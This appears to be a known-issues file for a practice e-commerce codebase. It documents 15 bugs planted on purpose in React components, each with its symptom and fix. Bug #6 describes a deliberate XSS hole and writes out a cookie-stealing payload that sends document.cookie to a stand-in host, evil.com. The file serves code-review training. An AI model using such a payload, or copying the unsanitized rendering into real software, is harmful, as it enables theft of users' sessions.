# Known Frontend Issues — Mobelo Shop

This file documents 15 intentional frontend bugs embedded in the codebase for testing, training, and code review practice.

---

## Bug #1 — Memory Leak: setInterval not cleared on unmount

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/ImageGallery.tsx` |
| **Line**    | ~25 |
| **Type**    | Memory Leak |
| **Severity**| High |

**Description:**  
A `setInterval` is started inside `useEffect` to auto-advance the image slideshow, but the cleanup function is never returned. Every time the `ImageGallery` component mounts (e.g. navigating to a product and back), a new interval is created without ever clearing the old ones. This causes memory leaks and accelerating re-renders over time.

**Symptom:** Slide advances faster and faster the more times the product detail page is visited. Memory usage grows continuously.

**Fix:**
```ts
useEffect(() => {
  const interval = setInterval(..., 3000);
  return () => clearInterval(interval); // ← add this
}, [images.length]);
```

---

## Bug #2 — Missing `key` prop in list rendering

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/ProductList.tsx` |
| **Line**    | ~32 |
| **Type**    | React Warning / Performance |
| **Severity**| Medium |

**Description:**  
`ProductCard` components are rendered in a `.map()` without a `key` prop. React cannot efficiently reconcile the list when items are added, removed, or reordered, causing unnecessary full re-renders and potential UI glitches.

Also present: star rating SVGs in `ProductCard.tsx` (~line 44) are mapped without keys.

**Symptom:** React console warning: *"Each child in a list should have a unique 'key' prop."*

**Fix:**
```tsx
{products.map((product) => (
  <ProductCard key={product.id} product={product} />
))}
```

---

## Bug #3 — Infinite re-render: unstable object in useEffect deps

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/SearchBar.tsx` |
| **Line**    | ~22 |
| **Type**    | Infinite Loop / Performance |
| **Severity**| Critical |

**Description:**  
`SearchBar` receives a `filters` prop with a default value of `{ minPrice: 0, maxPrice: 1000 }`. Because this is an object literal defined inline at the call site (`products/page.tsx` line ~28), a new object reference is created on every parent render. The `useEffect` in `SearchBar` depends on `filters`, so it fires on every render → triggers `onResults` → triggers parent state update → triggers re-render → infinite loop.

**Symptom:** Browser tab freezes or crashes when `SearchBar` is used.

**Fix (option A):** Destructure primitive values in the dep array:
```ts
useEffect(() => { ... }, [query, filters.minPrice, filters.maxPrice]);
```
**Fix (option B):** Memoize the filters object in the parent with `useMemo`.

---

## Bug #4 — Race condition: async fetch without AbortController

| Field       | Detail |
|-------------|--------|
| **File**    | `src/hooks/useProducts.ts` |
| **Line**    | ~17 |
| **Type**    | Race Condition |
| **Severity**| High |

**Description:**  
`useProducts` fires a `fetchProducts()` call whenever `category` changes. If the user switches categories rapidly, multiple in-flight requests exist simultaneously. Because there is no `AbortController`, whichever request resolves last wins — even if it was for a category the user navigated away from. This can show stale data.

**Symptom:** Selecting "Fashion" then quickly switching to "Electronics" may display Fashion products.

**Fix:**
```ts
useEffect(() => {
  const controller = new AbortController();
  fetchProducts(category, controller.signal).then(setProducts);
  return () => controller.abort();
}, [category]);
```

---

## Bug #5 — Stale closure in useEffect/setInterval

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/CountdownTimer.tsx` |
| **Line**    | ~17 |
| **Type**    | Stale Closure |
| **Severity**| High |

**Description:**  
The `useEffect` has an empty dependency array `[]`, so the closure over `seconds` captures the initial value (e.g. `7200`) forever. Inside the `setInterval` callback, `seconds` never changes — the timer immediately clears itself on the first tick because it always sees the initial value and the subtraction never progresses.

**Symptom:** Countdown timer either freezes at the initial value or immediately hits 0 and stops.

**Fix:**
```ts
setSeconds((prev) => prev - 1); // use functional update — no stale closure
```

---

## Bug #6 — XSS: dangerouslySetInnerHTML with unsanitized user input

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/ReviewSection.tsx` |
| **Line**    | ~73 |
| **Type**    | Security — XSS |
| **Severity**| Critical |

**Description:**  
User-submitted review text is rendered using `dangerouslySetInnerHTML`. No sanitization is applied before rendering. An attacker can inject `<script>alert('xss')</script>` or steal cookies via `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`.

A demo payload already exists in `src/lib/mockData.ts` in the review for product `"1"`.

**Symptom:** Arbitrary JavaScript executes when the product detail page loads.

**Fix:** Use a sanitization library like `DOMPurify` before rendering:
```tsx
import DOMPurify from "dompurify";
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.comment) }} />
```
Or better: render as plain text without `dangerouslySetInnerHTML`.

---

## Bug #7 — Floating-point arithmetic in cart totals

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/Cart.tsx` |
| **Line**    | ~22 |
| **Type**    | Logic Bug |
| **Severity**| Medium |

**Description:**  
Cart subtotal, tax, and total are computed using raw JavaScript floating-point addition. For example, adding items priced `$0.10` and `$0.20` yields `$0.30000000000000004`. With many items, errors compound and the displayed total diverges from the correct value.

**Symptom:** Total shows values like `$29.700000000000003` instead of `$29.70`.

**Fix:** Round intermediate results or use integer arithmetic (store prices in cents):
```ts
const subtotal = Math.round(
  items.reduce((acc, i) => acc + i.product.price * i.quantity, 0) * 100
) / 100;
```

---

## Bug #8 — Event listener leak: scroll handler not removed

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/Navbar.tsx` |
| **Line**    | ~22 |
| **Type**    | Memory Leak |
| **Severity**| High |

**Description:**  
`window.addEventListener('scroll', handler)` is called inside `useEffect`, but the handler reference is an anonymous inline arrow function — it can never be removed because `removeEventListener` requires the exact same function reference. Every time `Navbar` mounts, a new listener is added. In SPAs where layout components re-mount, this multiplies.

**Symptom:** Scroll events fire multiple times per scroll event; performance degrades over time.

**Fix:**
```ts
useEffect(() => {
  const handler = () => setScrolled(window.scrollY > 50);
  window.addEventListener("scroll", handler);
  return () => window.removeEventListener("scroll", handler);
}, []);
```

---

## Bug #9 — Context value not memoized: unnecessary re-renders

| Field       | Detail |
|-------------|--------|
| **File**    | `src/context/CartContext.tsx` |
| **Line**    | ~59 |
| **Type**    | Performance |
| **Severity**| Medium |

**Description:**  
The `value` object passed to `CartContext.Provider` is reconstructed on every render of `CartProvider`. Because objects are compared by reference in React, every consumer of `useCart()` re-renders on every parent render — even when the cart data hasn't changed.

**Symptom:** Every component using `useCart()` re-renders whenever any ancestor state changes.

**Fix:** Wrap the value in `useMemo`:
```tsx
const value = useMemo(
  () => ({ items, addToCart, removeFromCart, updateQuantity, clearCart, itemCount }),
  [items, itemCount]
);
```

---

## Bug #10 — No error boundary around product section

| Field       | Detail |
|-------------|--------|
| **File**    | `src/app/products/page.tsx` |
| **Line**    | ~36 |
| **Type**    | Missing Error Handling |
| **Severity**| Medium |

**Description:**  
If `useProducts` throws synchronously, or if `ProductList` or any `ProductCard` throws during render, the entire page crashes with a white screen and no user-facing message. There is no `<ErrorBoundary>` wrapping the product listing area.

**Symptom:** Unhandled render errors crash the whole page — no fallback UI.

**Fix:** Create an `ErrorBoundary` component and wrap the product section:
```tsx
<ErrorBoundary fallback={<p>Failed to load products.</p>}>
  <ProductList products={displayProducts} />
</ErrorBoundary>
```

---

## Bug #11 — Broken image fallback: no `onError` handler

| Field       | Detail |
|-------------|--------|
| **File**    | `src/components/ProductCard.tsx` |
| **Line**    | ~23 |
| **Type**    | UI Bug |
| **Severity**| Low |

**Description:**  
Product images are rendered with a raw `<img>` tag but no `onError` handler. If the image URL is broken, unavailable, or returns a 404, the browser displays a broken image icon instead of a placeholder.

**Symptom:** Broken image icons appear for products with unavailable images.

**Fix:**
```tsx
<img
  src={product.image}
  alt={product.name}
  onError={(e) => { (e.target as HTMLImageElement).src = "/placeholder.png"; }}
/>
```

---

## Bug #12 — No loading skeleton: content flash

| Field       | Detail |
|-------------|--------|
| **File**    | `src/app/products/page.tsx` |
| **Line**    | ~39 |
| **Type**    | UX Bug |
| **Severity**| Low |

**Description:**  
While products are loading, the page shows a plain "Loading products..." text string instead of a skeleton grid. The content then flashes in abruptly once loading completes, causing layout shift.

**Symptom:** Visible content flash and layout jump on every page load.

**Fix:** Replace loading text with a skeleton grid matching the product card layout using Tailwind `animate-pulse` classes.

---

## Bug #13 — No form validation on checkout

| Field       | Detail |
|-------------|--------|
| **File**    | `src/app/checkout/page.tsx` |
| **Line**    | ~54 |
| **Type**    | Logic Bug / UX |
| **Severity**| High |

**Description:**  
The checkout form `handleSubmit` function sends the order without validating any fields. A user can submit with empty name, email, address, and payment details. No `required` HTML attributes are set either. The order "succeeds" with blank data.

**Symptom:** Clicking "Place Order" with a completely empty form proceeds to the success page.

**Fix:** Add field-level validation before calling the API:
```ts
if (!form.email || !form.cardNumber || !form.firstName) {
  setError("Please fill in all required fields.");
  return;
}
```

---

## Bug #14 — Z-index conflict: dropdown rendered behind card

| Field       | Detail |
|-------------|--------|
| **File**    | `src/app/checkout/page.tsx` |
| **Line**    | ~103 |
| **Type**    | CSS / UI Bug |
| **Severity**| Low |

**Description:**  
The custom "Country" dropdown in the shipping section is a `position: absolute` element. The payment card section below it has a `shadow-sm` class which creates a new stacking context, but no `z-index` is set on the dropdown. On many browsers, the dropdown appears behind the payment card instead of floating above it.

**Symptom:** The country dropdown list is partially or fully hidden behind the payment details card.

**Fix:** Add `z-index: 50` (Tailwind `z-50`) to the dropdown list:
```tsx
<div className="absolute top-full left-0 right-0 bg-white border rounded-lg shadow-lg mt-1 z-50">
```

---

## Bug #15 — Prop drilling: auth state passed manually through layers

| Field       | Detail |
|-------------|--------|
| **File**    | `src/app/login/page.tsx` + `src/components/Navbar.tsx` |
| **Type**    | Architecture / Maintainability |
| **Severity**| Low |

**Description:**  
Although `AuthContext` exists and is correctly set up, several components could consume it directly but instead expect user/auth data to be drilled down as props. This creates unnecessary coupling and becomes a maintenance burden as the component tree grows.

**Symptom:** Changing auth shape requires updating prop types across multiple unrelated components.

**Fix:** Remove prop drilling and consume `useAuth()` directly in each component that needs it.

---

## Summary Table

| # | Bug | File | Severity |
|---|-----|------|----------|
| 1 | `setInterval` not cleared (memory leak) | `ImageGallery.tsx` | High |
| 2 | Missing `key` prop in list | `ProductList.tsx`, `ProductCard.tsx` | Medium |
| 3 | Infinite re-render (unstable object dep) | `SearchBar.tsx` | Critical |
| 4 | Race condition (no AbortController) | `useProducts.ts` | High |
| 5 | Stale closure in CountdownTimer | `CountdownTimer.tsx` | High |
| 6 | XSS via `dangerouslySetInnerHTML` | `ReviewSection.tsx` | Critical |
| 7 | Floating-point cart total bug | `Cart.tsx` | Medium |
| 8 | Scroll listener not removed | `Navbar.tsx` | High |
| 9 | Context value not memoized | `CartContext.tsx` | Medium |
| 10 | No error boundary | `products/page.tsx` | Medium |
| 11 | No image error fallback | `ProductCard.tsx` | Low |
| 12 | No loading skeleton | `products/page.tsx` | Low |
| 13 | No checkout form validation | `checkout/page.tsx` | High |
| 14 | Z-index conflict on dropdown | `checkout/page.tsx` | Low |
| 15 | Prop drilling instead of context | `login/page.tsx` | Low |
